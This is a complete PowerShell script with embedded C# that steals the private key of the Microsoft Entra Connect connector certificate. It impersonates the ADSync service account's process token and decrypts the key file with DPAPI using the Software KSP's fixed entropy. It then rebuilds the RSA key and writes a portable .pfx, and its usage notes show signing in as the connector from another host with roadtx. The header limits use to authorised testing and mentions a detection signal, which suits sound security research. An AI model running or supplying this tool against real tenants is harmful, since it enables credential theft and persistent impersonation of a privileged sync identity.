<#
.SYNOPSIS
    Path A (DPAPI theft). Extract the Microsoft Entra Connect connector certificate's private
    key off the Connect host and rebuild a portable .pfx usable off-host, from any IP.

.DESCRIPTION
    Run only on a Connect host you are authorised to test, as an administrator or SYSTEM.

    Since Entra Connect 2.5.76 the sync client authenticates to Entra as an application using a
    client certificate. That certificate's private key is a non-exportable CNG key living in the
    ADSync standalone Managed Service Account (sMSA) context, so a naive X509Certificate2.Export()
    fails with "Key not valid for use in specified state".

    On a host without a TPM the CNG "Microsoft Software Key Storage Provider" stores the key as a
    DPAPI-protected blob on disk. This script:

        1. Impersonates miiserver.exe (runs as the ADSync sMSA) so we act as the account that
           owns the key.
        2. Locates the connector certificate under that identity: by thumbprint if you supply
           one, otherwise auto-discovered as the sMSA store's certificate that has a CNG private
           key (there is normally exactly one).
        3. Decrypts the CNG private-key blob with DPAPI (CryptUnprotectData) using the Software
           KSP's fixed entropy "xT5rZW5qVVbrvpuA" -> a BCRYPT_RSAPRIVATE_BLOB ("RSA2").
        4. Rebuilds a full RSAParameters set (recomputing the CRT parameters D, DP, DQ, InverseQ
           from e, p, q), fuses it with the certificate's public part, and exports a portable
           connector.pfx.

    On a TPM-backed host this fails - the private key is sealed in the chip and cannot be
    exported. The script detects that up front (the key's CNG provider) and stops with a clear
    message instead of a cryptic DPAPI error.

    The resulting .pfx authenticates as the connector from anywhere. The sign-in then appears in
    AADServicePrincipalSignInLogs from the attacker's IP under the connector's own credential
    keyId; that IP mismatch is the detection signal (see README.md, Detection). A key-count hunt
    does not catch it, because no new key was added.

.PARAMETER Thumbprint
    Connector certificate thumbprint. Optional: omit it and the script auto-discovers the
    connector cert in the sMSA store. Supply it only to disambiguate when several certificates
    with private keys are present.

.PARAMETER OutPfx
    Output path for the rebuilt portable .pfx. Default: .\connector.pfx

.PARAMETER PfxPassword
    Password for the output .pfx. Default: Stolen!Lab

.EXAMPLE
    # Auto-discover the connector cert and steal it:
    .\Extract-EntraConnectCertificate.ps1 -OutPfx C:\Tools\connector.pfx

.EXAMPLE
    # Then off-host, authenticate as the connector with roadtx (see README.md):
    #   roadtx appauth -c <connectorAppId> -t <tenant> `
    #       -r 6bf85cfa-ac8a-4be5-b5de-425a0d0dc016 --cert-pfx connector.pfx --pfx-pass 'Stolen!Lab'

.NOTES
    Technique credit: DPAPI / CNG key-blob decryption follows the public research of
    Dr. Nestori Syynimaa (AADInternals) and Dirk-jan Mollema (adconnectdump). See README.md.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$Thumbprint = "",

    [Parameter(Mandatory = $false)]
    [string]$OutPfx = ".\connector.pfx",

    [Parameter(Mandatory = $false)]
    [string]$PfxPassword = "Stolen!Lab"
)

$ErrorActionPreference = "Stop"

# PowerShell's Set-Location/cd changes $PWD but not the .NET process working directory, which an
# elevated shell leaves at C:\Windows\System32. [IO.File] APIs resolve relative paths against that,
# so resolve -OutPfx against the caller's real PowerShell location up front (absolute paths pass through).
$OutPfx = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($OutPfx)

# ---------------------------------------------------------------------------------------------
# Native helper: impersonate miiserver.exe, find the connector cert (by thumbprint or by
# auto-discovery), and DPAPI-decrypt its CNG private-key blob.
#
# Everything that must run under the sMSA identity happens inside DpapiKeyExtractor.Extract():
# we impersonate the process, read the cert + its CNG key file, then CryptUnprotectData the
# private-key blob with the Software KSP entropy. The decrypted "RSA2" blob is handed back to
# PowerShell for reassembly.
# ---------------------------------------------------------------------------------------------
$nativeHelper = @"
using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;

public class DpapiKeyExtractor
{
    // --- token / impersonation ---
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint desiredAccess, bool inheritHandle, int processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr process, uint desiredAccess, out IntPtr token);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr existingToken, uint desiredAccess, IntPtr attributes,
                                        int impersonationLevel, int tokenType, out IntPtr newToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr token);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string host, string name, out LUID luid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll,
        ref TOKEN_PRIVILEGES newState, int bufferLength, IntPtr previousState, IntPtr returnLength);

    [StructLayout(LayoutKind.Sequential)] struct LUID { public uint LowPart; public int HighPart; }
    [StructLayout(LayoutKind.Sequential)] struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)] struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privilege; }

    // Enable a named privilege (e.g. SeDebugPrivilege) in THIS process token, so we can open and
    // duplicate the token of miiserver.exe (running as the sMSA). The caller must already hold the
    // privilege - i.e. run elevated, or as SYSTEM. Best effort.
    static void EnablePrivilege(string name)
    {
        IntPtr hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken)) return;
        LUID luid;
        if (!LookupPrivilegeValue(null, name, out luid)) return;
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privilege.Luid = luid;
        tp.Privilege.Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }

    // --- DPAPI ---
    [StructLayout(LayoutKind.Sequential)]
    struct DataBlob { public int cbData; public IntPtr pbData; }

    [DllImport("crypt32.dll", SetLastError = true)]
    static extern bool CryptUnprotectData(ref DataBlob input, IntPtr description, ref DataBlob entropy,
                                          IntPtr reserved, IntPtr prompt, int flags, ref DataBlob output);

    // Access rights / flags
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint TOKEN_DUPLICATE           = 0x0002;
    const uint TOKEN_QUERY               = 0x0008;
    const uint TOKEN_ALL_ACCESS          = 0x000F01FF;
    const int  SecurityImpersonation     = 2;   // SECURITY_IMPERSONATION_LEVEL
    const int  TokenImpersonation        = 2;   // TOKEN_TYPE
    const uint TOKEN_ADJUST_PRIVILEGES   = 0x0020;
    const uint SE_PRIVILEGE_ENABLED      = 0x0002;

    // Diagnostics + results surfaced back to PowerShell.
    public static string Log = "";
    public static byte[] CertificateDer = null;
    public static string DiscoveredThumbprint = null;
    public static string DiscoveredSubject = null;
    public static string Candidates = "";
    public static string KeyProvider = null;   // CNG provider backing the key
    public static bool   TpmBacked = false;     // true if the key lives in the TPM (not exportable)

    static DataBlob MakeBlob(byte[] data)
    {
        DataBlob blob;
        blob.cbData = (data == null) ? 0 : data.Length;
        blob.pbData = (data == null) ? IntPtr.Zero : Marshal.AllocHGlobal(data.Length);
        if (data != null) Marshal.Copy(data, 0, blob.pbData, data.Length);
        return blob;
    }

    // Impersonate the target process, select the connector certificate, DPAPI-decrypt its
    // private-key blob, and return it (an "RSA2" BCRYPT_RSAPRIVATE_BLOB). Returns null on
    // failure; inspect DpapiKeyExtractor.Log (and .Candidates) for the reason.
    public static byte[] Extract(int processId, string thumbprint)
    {
        // Reset statics - they persist for the life of the PowerShell session (the type is cached).
        Log = ""; CertificateDer = null; DiscoveredThumbprint = null; DiscoveredSubject = null;
        Candidates = ""; KeyProvider = null; TpmBacked = false;

        EnablePrivilege("SeDebugPrivilege");   // required to open the sMSA-owned miiserver.exe token

        IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, processId);
        if (processHandle == IntPtr.Zero)
        { Log += "openprocess_failed_err" + Marshal.GetLastWin32Error() + " (run elevated / as SYSTEM)"; return null; }

        IntPtr token, duplicateToken;
        if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_QUERY, out token))
        { Log += "openprocesstoken_failed_err" + Marshal.GetLastWin32Error() + " (run elevated / as SYSTEM)"; return null; }
        if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, IntPtr.Zero, SecurityImpersonation, TokenImpersonation, out duplicateToken))
        { Log += "duplicatetoken_failed_err" + Marshal.GetLastWin32Error(); return null; }
        if (!ImpersonateLoggedOnUser(duplicateToken))
        { Log += "impersonation_failed_err" + Marshal.GetLastWin32Error() + " (run elevated / as SYSTEM)"; return null; }

        string keyFileName = null;
        try
        {
            X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadOnly);

            // Candidates = certificates that actually have a CNG private key (the connector cert does).
            List<X509Certificate2> candidates = new List<X509Certificate2>();
            foreach (X509Certificate2 cert in store.Certificates)
            {
                RSA rsa = RSACertificateExtensions.GetRSAPrivateKey(cert);
                if ((rsa as RSACng) != null) candidates.Add(cert);
            }

            // Pick the target: by thumbprint if given, else auto-discover the sole candidate.
            X509Certificate2 chosen = null;
            if (!string.IsNullOrEmpty(thumbprint))
            {
                foreach (X509Certificate2 c in candidates)
                    if (c.Thumbprint == thumbprint) { chosen = c; break; }
            }
            else
            {
                foreach (X509Certificate2 c in candidates) Candidates += c.Thumbprint + "  " + c.Subject + "\n";
                if (candidates.Count == 1) chosen = candidates[0];
                else if (candidates.Count == 0) Log += "no_certificate_with_a_cng_private_key_in_sMSA_store";
                else Log += "multiple_candidates_pass_-Thumbprint";
            }

            if (chosen != null)
            {
                DiscoveredThumbprint = chosen.Thumbprint;
                DiscoveredSubject = chosen.Subject;
                CertificateDer = chosen.GetRawCertData();
                RSACng cng = RSACertificateExtensions.GetRSAPrivateKey(chosen) as RSACng;
                if (cng != null)
                {
                    keyFileName = cng.Key.UniqueName;            // the on-disk CNG key file name
                    KeyProvider = cng.Key.Provider.Provider;     // e.g. "Microsoft Software/Platform Crypto Provider"
                    // A Platform Crypto Provider key is sealed in the TPM and cannot be exported.
                    TpmBacked = KeyProvider != null &&
                                KeyProvider.IndexOf("Platform Crypto", StringComparison.OrdinalIgnoreCase) >= 0;
                }
            }
            store.Close();
        }
        catch (Exception ex) { Log += "cert_error:" + ex.Message; }

        // TPM check first: if the key is TPM-backed, stop here (DPAPI extraction is impossible).
        if (TpmBacked)
        {
            RevertToSelf();
            Log += "tpm_backed_key(provider='" + KeyProvider + "')_cannot_be_exported";
            return null;
        }

        if (keyFileName == null)
        {
            RevertToSelf();
            if (Log == "") Log += "cert_or_key_not_found";
            return null;
        }

        // CNG software keys live under ProgramData or the user's AppData "Crypto\Keys" folder.
        string[] keyDirs =
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                         "Microsoft", "Crypto", "Keys"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                         "Microsoft", "Crypto", "Keys")
        };
        string keyFilePath = null;
        foreach (string dir in keyDirs)
        {
            string candidate = Path.Combine(dir, keyFileName);
            if (File.Exists(candidate)) { keyFilePath = candidate; break; }
        }
        if (keyFilePath == null) { RevertToSelf(); Log += "keyfile_not_found"; return null; }

        // Parse the CNG key-file header to locate the DPAPI-protected private-key blob.
        //   [0]=version [8]=nameLen [16]=publicPropsLen [20]=privatePropsLen [24]=privateKeyLen
        //   payload starts at 44 + nameLen + publicPropsLen + privatePropsLen
        byte[] file = File.ReadAllBytes(keyFilePath);
        int nameLen         = BitConverter.ToInt32(file, 8);
        int publicPropsLen  = BitConverter.ToInt32(file, 16);
        int privatePropsLen = BitConverter.ToInt32(file, 20);
        int privateKeyLen   = BitConverter.ToInt32(file, 24);
        int offset = 44 + nameLen + publicPropsLen + privatePropsLen;

        byte[] protectedBlob = new byte[privateKeyLen];
        Array.Copy(file, offset, protectedBlob, 0, privateKeyLen);

        // The Software KSP protects the blob with this fixed secondary entropy (null-terminated).
        byte[] entropy = System.Text.Encoding.ASCII.GetBytes("xT5rZW5qVVbrvpuA\0");

        DataBlob inBlob = MakeBlob(protectedBlob);
        DataBlob entropyBlob = MakeBlob(entropy);
        DataBlob outBlob = new DataBlob();
        byte[] decrypted = null;

        if (CryptUnprotectData(ref inBlob, IntPtr.Zero, ref entropyBlob, IntPtr.Zero, IntPtr.Zero, 0, ref outBlob))
        {
            decrypted = new byte[outBlob.cbData];
            Marshal.Copy(outBlob.pbData, decrypted, 0, outBlob.cbData);
            Log += "decrypt_ok";
        }
        else
        {
            Log += "decrypt_failed(key may be TPM-backed and non-exportable) err=" + Marshal.GetLastWin32Error();
        }

        RevertToSelf();
        return decrypted;
    }
}
"@
# Add-Type caches the type for the life of the PowerShell session and a loaded type cannot be
# redefined, so only compile it if it isn't already present (re-runs in one session then work).
if (-not ([System.Management.Automation.PSTypeName]'DpapiKeyExtractor').Type) {
    Add-Type -TypeDefinition $nativeHelper -Language CSharp -ReferencedAssemblies System.Security
}

# ---------------------------------------------------------------------------------------------
# Big-integer helpers to rebuild the full RSA parameter set from the "RSA2" blob.
# The blob only carries e, n, p and q; we recompute d, dp, dq and inverseQ.
# ---------------------------------------------------------------------------------------------

# Big-endian bytes -> BigInteger (append a 0 byte so the value stays positive).
function Convert-BytesToBigInteger([byte[]]$bigEndian) {
    $littleEndian = New-Object byte[] ($bigEndian.Length + 1)
    for ($i = 0; $i -lt $bigEndian.Length; $i++) { $littleEndian[$i] = $bigEndian[$bigEndian.Length - 1 - $i] }
    $littleEndian[$bigEndian.Length] = 0
    [System.Numerics.BigInteger]::new($littleEndian)
}

# BigInteger -> fixed-length big-endian bytes (left-padded / trimmed to $length).
function Convert-BigIntegerToBytes([System.Numerics.BigInteger]$value, [int]$length) {
    $little = $value.ToByteArray()
    if ($little.Length -gt 1 -and $little[$little.Length - 1] -eq 0) { $little = $little[0..($little.Length - 2)] }
    $big = New-Object byte[] $little.Length
    for ($i = 0; $i -lt $little.Length; $i++) { $big[$i] = $little[$little.Length - 1 - $i] }
    if ($big.Length -gt $length) { $big = $big[($big.Length - $length)..($big.Length - 1)] }
    $out = New-Object byte[] $length
    [Array]::Copy($big, 0, $out, $length - $big.Length, $big.Length)
    , $out
}

# Modular inverse via the extended Euclidean algorithm: returns a^-1 mod m.
function Get-ModularInverse([System.Numerics.BigInteger]$a, [System.Numerics.BigInteger]$m) {
    $g = $m
    $x = [System.Numerics.BigInteger]::Zero
    $x1 = [System.Numerics.BigInteger]::One
    $a = $a % $m
    while ($a -gt 0) {
        $q = [System.Numerics.BigInteger]::Divide($g, $a)
        $t = $g - $q * $a; $g = $a; $a = $t
        $t2 = $x - $q * $x1; $x = $x1; $x1 = $t2
    }
    if ($x -lt 0) { $x += $m }
    $x
}

# ---------------------------------------------------------------------------------------------
# Run
# ---------------------------------------------------------------------------------------------
$miiserver = Get-CimInstance Win32_Process -Filter "Name='miiserver.exe'" -ErrorAction SilentlyContinue
if (-not $miiserver) { throw "miiserver.exe is not running - is this the Entra Connect Sync host?" }

# --- Preflight: TPM presence on the host (context only). The DEFINITIVE test is the key's CNG
#     provider, checked during extraction below: a Software-KSP key is DPAPI-extractable, a
#     Platform Crypto Provider (TPM) key is not. ---
try {
    $tpm = Get-CimInstance -Namespace 'root/cimv2/security/microsofttpm' -ClassName Win32_Tpm -ErrorAction Stop
    if ($tpm) {
        Write-Host "[i] Host TPM present (enabled=$($tpm.IsEnabled_InitialValue), activated=$($tpm.IsActivated_InitialValue)) - the connector key MAY be TPM-backed."
    } else {
        Write-Host "[i] No host TPM detected - a software-KSP connector key is DPAPI-extractable."
    }
} catch {
    Write-Host "[i] Host TPM status unknown ($(($_.Exception.Message -split "`n")[0]))."
}

if ($Thumbprint) { $Thumbprint = $Thumbprint.Replace(" ", "").ToUpper() }
$rsaBlob = [DpapiKeyExtractor]::Extract([int]$miiserver.ProcessId, $Thumbprint)
Write-Host "[i] $([DpapiKeyExtractor]::Log)"

if (-not $rsaBlob) {
    if ([DpapiKeyExtractor]::TpmBacked) {
        Write-Host "[!] The connector key is TPM-backed (CNG provider '$([DpapiKeyExtractor]::KeyProvider)')." -ForegroundColor Yellow
        throw "TPM-backed key cannot be exported - the private key never leaves the chip. DPAPI theft is not possible on this host."
    }
    if ([DpapiKeyExtractor]::Candidates) {
        Write-Host "[!] Several certificates with private keys were found - re-run with -Thumbprint <one of>:" -ForegroundColor Yellow
        Write-Host ([DpapiKeyExtractor]::Candidates)
    }
    throw "extraction failed (see log above)."
}
if ([Text.Encoding]::ASCII.GetString($rsaBlob, 0, 4) -ne "RSA2") {
    throw "unexpected blob magic - expected a BCRYPT_RSAPRIVATE_BLOB ('RSA2')."
}
Write-Host "[+] connector certificate: $([DpapiKeyExtractor]::DiscoveredThumbprint)  ($([DpapiKeyExtractor]::DiscoveredSubject))"
Write-Host "[+] key provider: $([DpapiKeyExtractor]::KeyProvider) (software-backed - exportable)"
Write-Host "[+] private key extracted ($($rsaBlob.Length)-byte RSA2 blob)"

# --- Parse the BCRYPT_RSAPRIVATE_BLOB header ---
#   [0]=magic "RSA2"  [4]=bitLength  [8]=cbPublicExp  [12]=cbModulus  [16]=cbPrime1  [20]=cbPrime2
#   payload @24: PublicExponent | Modulus | Prime1 | Prime2
$cbPublicExp = [BitConverter]::ToInt32($rsaBlob, 8)
$cbModulus   = [BitConverter]::ToInt32($rsaBlob, 12)
$cbPrime1    = [BitConverter]::ToInt32($rsaBlob, 16)
$cbPrime2    = [BitConverter]::ToInt32($rsaBlob, 20)

$pos = 24
$publicExpBytes = $rsaBlob[$pos..($pos + $cbPublicExp - 1)]; $pos += $cbPublicExp
$modulusBytes   = $rsaBlob[$pos..($pos + $cbModulus - 1)];   $pos += $cbModulus
$prime1Bytes    = $rsaBlob[$pos..($pos + $cbPrime1 - 1)];    $pos += $cbPrime1
$prime2Bytes    = $rsaBlob[$pos..($pos + $cbPrime2 - 1)]

# --- Recompute the CRT parameters the blob omits ---
$e = Convert-BytesToBigInteger $publicExpBytes
$n = Convert-BytesToBigInteger $modulusBytes
$p = Convert-BytesToBigInteger $prime1Bytes
$q = Convert-BytesToBigInteger $prime2Bytes
$one = [System.Numerics.BigInteger]::One

$d        = Get-ModularInverse $e (($p - $one) * ($q - $one))   # private exponent
$dp       = $d % ($p - $one)
$dq       = $d % ($q - $one)
$inverseQ = Get-ModularInverse $q $p

# --- Assemble RSAParameters (big-endian, fixed widths for a 2048-bit key) ---
$rsaParams = New-Object System.Security.Cryptography.RSAParameters
$rsaParams.Modulus  = Convert-BigIntegerToBytes $n 256
$rsaParams.Exponent = Convert-BigIntegerToBytes $e $cbPublicExp
$rsaParams.D        = Convert-BigIntegerToBytes $d 256
$rsaParams.P        = Convert-BigIntegerToBytes $p 128
$rsaParams.Q        = Convert-BigIntegerToBytes $q 128
$rsaParams.DP       = Convert-BigIntegerToBytes $dp 128
$rsaParams.DQ       = Convert-BigIntegerToBytes $dq 128
$rsaParams.InverseQ = Convert-BigIntegerToBytes $inverseQ 128

$rsa = [System.Security.Cryptography.RSA]::Create()
$rsa.ImportParameters($rsaParams)

# --- Fuse the recovered private key with the certificate's public part and export a PFX ---
$publicCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(, [DpapiKeyExtractor]::CertificateDer)
$certWithKey = [System.Security.Cryptography.X509Certificates.RSACertificateExtensions]::CopyWithPrivateKey($publicCert, $rsa)

$pfxBytes = $certWithKey.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pkcs12, $PfxPassword)
[IO.File]::WriteAllBytes($OutPfx, $pfxBytes)

Write-Host "[+] portable connector cert written -> $OutPfx (thumbprint $($publicCert.Thumbprint), password '$PfxPassword')" -ForegroundColor Green
Write-Host "[i] Copy it off-host and authenticate as the connector from any IP (see README.md -> roadtx)."
